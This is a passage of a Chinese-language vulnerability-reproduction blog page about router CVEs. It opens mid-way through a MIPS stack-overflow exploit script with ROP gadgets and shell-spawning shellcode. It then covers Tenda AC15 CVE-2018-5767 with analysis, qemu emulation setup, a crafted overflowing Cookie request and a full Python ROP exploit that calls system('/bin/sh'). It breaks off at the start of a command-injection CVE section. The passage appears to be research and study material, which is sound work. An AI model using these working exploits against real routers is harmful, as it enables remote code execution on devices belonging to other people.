</span></span><span class="line"><span class="cl"><span class="n">gadget3</span> <span class="o">=</span> <span class="mh">0x76705f1c</span>
</span></span><span class="line"><span class="cl"><span class="s1">'''
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76705f1c: move t9,s2
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76705f20: lw ra,36(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76705f24: lw s2,32(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76705f28: lw s1,28(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76705f2c: lw s0,24(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x76705f30: jr t9
</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget4</span> <span class="o">=</span> <span class="mh">0x766fbdd0</span>
</span></span><span class="line"><span class="cl"><span class="s1">'''
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766fbdd0: addiu a0,sp,24
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766fbdd4 &lt;optarg&gt;: move t9,s0
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x766fbdd8: jalr t9
</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
</span></span><span class="line"><span class="cl"><span class="n">gadget5</span> <span class="o">=</span> <span class="mh">0x767064a0</span>
</span></span><span class="line"><span class="cl"><span class="s1">'''
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x767064a0: move t9,a0
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x767064a4: sw v0,24(sp)
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x767064a8: jalr t9
</span></span></span><span class="line"><span class="cl"><span class="s1">'''</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\xff\xff\x06\x28</span><span class="s2">"</span>  <span class="c1"># slti $a2, $zero, -1</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x62\x69\x0f</span><span class="s2"> "</span>  <span class="c1"># lui $t7, 0x6962</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x2f\x2f\xef\x35</span><span class="s2">"</span>  <span class="c1"># ori $t7, $t7, 0x2f2f</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf4\xff\xaf\xaf</span><span class="s2">"</span>  <span class="c1"># sw $t7, -0xc($sp)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x73\x68\x0e</span><span class="s2"> "</span>  <span class="c1"># lui $t6, 0x6873</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x6e\x2f\xce\x35</span><span class="s2">"</span>  <span class="c1"># ori $t6, $t6, 0x2f6e</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf8\xff\xae\xaf</span><span class="s2">"</span>  <span class="c1"># sw $t6, -8($sp)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xfc\xff\xa0\xaf</span><span class="s2">"</span>  <span class="c1"># sw $zero, -4($sp)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf5\xff\xa4\x27</span><span class="s2">"</span>  <span class="c1"># addiu $a0, $sp, -0xc</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xff\xff\x05\x28</span><span class="s2">"</span>  <span class="c1"># slti $a1, $zero, -1</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xab\x0f\x02\x24</span><span class="s2">"</span>  <span class="c1"># addiu;$v0, $zero, 0xfab</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x0c\x01\x01\x01</span><span class="s2">"</span>  <span class="c1"># syscall 0x40404</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">508</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget3</span><span class="p">)</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sleep</span><span class="p">)</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"bbbb"</span><span class="c1">#s3</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget1</span><span class="p">)</span><span class="c1">#ra</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget5</span><span class="p">)</span><span class="c1">#s0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s1</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"cccc"</span><span class="c1">#s2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gadget4</span><span class="p">)</span><span class="c1">#ra</span>
</span></span><span class="line"><span class="cl"><span class="c1">#######</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"stack_bof_02_payload"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></div><div class="anchor" id="tenda"></div>
<h2 class="relative group">Tenda 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#tenda" style="text-decoration-line: none !important;">#</a></span>
</h2>
<div class="anchor" id="cve-2018-5767"></div>
<h3 class="relative group">CVE-2018-5767 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2018-5767" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-4"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-4" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2018-5767</li>
<li>漏洞类型： 栈溢出</li>
<li>漏洞利用效果：栈溢出，可以修改返回地址，进而远程执行代码</li>
<li>漏洞披露时间：2018.02.15</li>
<li>漏洞描述： 没有限制用户的输入，使用函数 sscanf 直接将输入拷贝到栈上，导致栈溢出，可以修改返回地址，进而远程执行代码</li>
<li>设备型号：Tenda AC15 V15.03.1.16_multi</li>
<li>设备架构：arm</li>
<li>复现进度：
<ul>
<li>静态分析</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：httpd</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>IDA</li>
<li>gdb</li>
</ul>
</li>
</ul>
<div class="anchor" id="漏洞分析-3"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-3" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>
<figure>
<img alt="image-20240224222957846" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/RQ5nyGf8kebsKEh.png"/>
</figure>
</p>
<p>查看漏洞函数<code>R7WebsSecurityHandler</code>的伪代码</p>
<p>
<figure>
<img alt="image-20240224223415057" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/GiswXpcgzKVjhyN.png"/>
</figure>
</p>
<p>第87行使用了函数 strstr 尝试在 (a1 + 184) 处找到 “password=” 字符串的位置</p>
<p>其中(a1 + 184) 是用户的http请求，password 是请求中 cookie 的一个字段</p>
<p>如果找到了 password，就会进入if分支，使用正则匹配 “password=” 之后的字符串，并将匹配出的结果存入变量 v33 中</p>
<p>可以看到v33的定义：</p>
<p>
<figure>
<img alt="image-20240224223546846" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/7MtrLPJ3YSskabh.png"/>
</figure>
</p>
<p>可以发现代码没有判断字段的最大长度，直接将内容拷贝到栈上</p>
<p>如果用户精心构造一个password，那么可能有机会利用<strong>栈溢出漏洞</strong>控制整个程序的流程，进而达到远程执行代码的目的</p>
<div class="anchor" id="漏洞复现-3"></div>
<h4 class="relative group">漏洞复现 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-3" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>先配置好qemu 的网络参数，首先安装必要的工具</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ apt-get install bridge-utils uml-utilities
</span></span></code></pre></div><p>接着要修改网络配置，编辑/etc/network/interfaces</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># interfaces(5) file used by ifup(8) and ifdown(8)</span>
</span></span><span class="line"><span class="cl">auto lo
</span></span><span class="line"><span class="cl">iface lo inet loopback
</span></span><span class="line"><span class="cl">auto ens33
</span></span><span class="line"><span class="cl">iface ens33  inet manual
</span></span><span class="line"><span class="cl">up ifconfig ens33  0.0.0.0 up
</span></span><span class="line"><span class="cl">auto br0
</span></span><span class="line"><span class="cl">iface br0 inet dhcp
</span></span><span class="line"><span class="cl"> bridge_ports ens33
</span></span><span class="line"><span class="cl"> bridge_maxwait <span class="m">0</span> 
</span></span></code></pre></div><p>新建一个shell 脚本 /etc/qemu-ifup</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">"Executing /etc/qemu-ifup"</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">"Bringing </span><span class="nv">$1</span><span class="s2"> for bridged mode..."</span>
</span></span><span class="line"><span class="cl">sudo /sbin/ifconfig <span class="nv">$1</span> 0.0.0.0 promisc up
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">"Adding </span><span class="nv">$1</span><span class="s2"> to br0"</span>
</span></span><span class="line"><span class="cl">sudo /sbin/brctl addif br0 <span class="nv">$1</span>
</span></span><span class="line"><span class="cl">sleep <span class="m">3</span>
</span></span></code></pre></div><p>重启网络服务</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ sudo /etc/init.d/networking restart
</span></span><span class="line"><span class="cl">$ sudo ifdown ens33
</span></span><span class="line"><span class="cl">$ sudo ifup br0
</span></span></code></pre></div><p>如果其中哪一步报错，尝试重启一下虚拟机。</p>
<p>启动程序：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ sudo chroot . ./qemu-arm-static -g <span class="m">10000</span> ./bin/httpd
</span></span></code></pre></div><p>中间出现出错，参考了<a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#:~:text=0%E3%80%82%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81-,%E6%89%8B%E5%8A%A8%20patch,-%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%20IDA" target="_blank">
    CataLpa师傅的文章</a>发现需要patch一下才能运行</p>
<p>patch完成功运行后抓一个数据包，这个包的内容应该如下：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/</span><span class="nx">goform</span><span class="o">/</span><span class="nx">execCommand</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">245.136</span>
</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">65.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">65.0</span>
</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">TW</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">HK</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.2</span>
</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
</span></span><span class="line"><span class="cl"><span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span>
</span></span></code></pre></div><p>为了触发漏洞，我们要手动添加一个Cookie 字段</p>
<p>构造以下 payload：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/</span><span class="nx">goform</span><span class="o">/</span><span class="nx">execCommand</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">245.136</span>
</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">65.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">65.0</span>
</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">TW</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="nx">zh</span><span class="o">-</span><span class="nx">HK</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.2</span>
</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
</span></span><span class="line"><span class="cl"><span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">password</span><span class="o">=</span><span class="s2">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaae.gifbbbbbbbbbbbbbbbbbbbbtesttest"</span>
</span></span><span class="line"><span class="cl"><span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span>
</span></span></code></pre></div><p>重放数据包，成功执行了puts 函数并输出我们的内容</p>
<p>用python写的exp如下：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s2">"192.168.211.7"</span>
</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">{:s}</span><span class="s2">/goform/exeCommand"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Accept'</span><span class="p">:</span> <span class="s1">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Accept-Language'</span><span class="p">:</span> <span class="s1">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Accept-Encoding'</span><span class="p">:</span> <span class="s1">'gzip, deflate'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Connection'</span><span class="p">:</span> <span class="s1">'close'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Upgrade-Insecure-Requests'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Cookie'</span><span class="p">:</span> <span class="s1">'password="aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaae.gifbbbbbbbbbbbbbbbbbbbbtesttest"'</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s1">'Cache-Control'</span><span class="p">:</span> <span class="s1">'max-age=0'</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="mh">0x3fde6000</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_r3_pc</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt; I"</span><span class="p">,</span><span class="mh">0x00018298</span><span class="o">+</span><span class="n">libc</span><span class="p">)</span><span class="c1">#pop r3 pc</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_r0_sp_blx_r3</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt; I"</span><span class="p">,</span> <span class="mh">0x00040cb8</span> <span class="o">+</span> <span class="n">libc</span><span class="p">)</span><span class="c1"># mov r0 sp; blx r3</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">"&lt; I"</span><span class="p">,</span> <span class="mh">0x0005A270</span><span class="o">+</span><span class="n">libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="c1"># 'byte'</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="mi">444</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">".gif"</span><span class="o">+</span><span class="n">pop_r3_pc</span><span class="o">+</span><span class="n">system</span><span class="o">+</span><span class="n">mov_r0_sp_blx_r3</span><span class="o">+</span><span class="n">command</span>
</span></span><span class="line"><span class="cl"><span class="n">headers</span><span class="p">[</span><span class="s1">'Cookie'</span><span class="p">]</span><span class="o">=</span><span class="sa">b</span><span class="s2">"password="</span><span class="o">+</span><span class="n">password</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span></code></pre></div><div class="anchor" id="cve-202010987"></div>
<h3 class="relative group">CVE-2020–10987 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-202010987" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-5"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-5" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2020–10987</li>
<li>漏洞类型： 命令注入</li>
<li>漏洞利用效果：执行任意系统命令</li>
<li>漏洞披露时间：2022.03.26</li>
<li>漏洞描述： goform/setUsbUnload端点允许远程攻击者通过deviceName POST参数执行任意系统命令</li>
<li>设备型号：Tenda AC15 AC1900 version 15.03.05.19</li>
<li>设备架构：arm</li>
<li>复现进度：
<ul>
<li>静态分析</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：httpd</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>SaTC</li>
<li>IDA</li>
</ul>
</li>
</ul>
<div class="anchor" id="satc定位漏洞"></div>
<h4 class="relative group">SaTC定位漏洞 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#satc%e5%ae%9a%e4%bd%8d%e6%bc%8f%e6%b4%9e" style="text-decoration-line: none !important;">#</a></span>
</h4>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ wget https://down.tenda.com.cn/uploadfile/AC18/ac18_kf_V15.03.05.19<span class="o">(</span>6318_<span class="o">)</span>_cn.zip
</span></span><span class="line"><span class="cl">$ binwalk -Me ac18_kf_V15.03.05.19<span class="o">(</span>6318_<span class="o">)</span>_cn.zip
